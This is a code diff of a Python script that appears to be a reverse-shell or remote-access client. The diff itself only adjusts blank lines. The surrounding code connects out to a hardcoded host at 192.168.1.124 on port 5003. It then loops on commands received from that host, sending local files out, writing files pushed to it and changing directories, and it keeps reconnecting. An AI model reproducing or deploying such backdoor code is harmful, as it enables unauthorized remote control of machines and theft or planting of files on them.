@@ -4,13 +4,13 @@ import subprocess
 
 from psutil import cpu_percent
 
+
 def all_func():
     SERVER_HOST = '192.168.1.124'
     SERVER_PORT = 5003
     BUFFER_SIZE = 4096
     s = socket.socket()
     s.connect((SERVER_HOST, SERVER_PORT))
-
 
     def download():
         full_path = s.recv(BUFFER_SIZE).decode()
@@ -24,7 +24,6 @@ def all_func():
                     break
                 s.sendall(bytes_read)
         s.send('^^^^^^^^^^^^^^^^^^^^^'.encode())
-
 
     def upload():
         full_path = s.recv(BUFFER_SIZE).decode()
@@ -40,12 +39,10 @@ def all_func():
                 f.write(bytes_read)
         s.send('^^^^^^^^^^^^^^^^^^^^^'.encode())
 
-
     def change_dir():
         full_path = s.recv(BUFFER_SIZE).decode()
         os.chdir(full_path)
         s.send('Executed.'.encode())
-
 
     while True:
         command = s.recv(BUFFER_SIZE).decode()
@@ -70,6 +67,7 @@ def all_func():
 
     # close client connection
     s.close()
+
 
 while True:
     try:
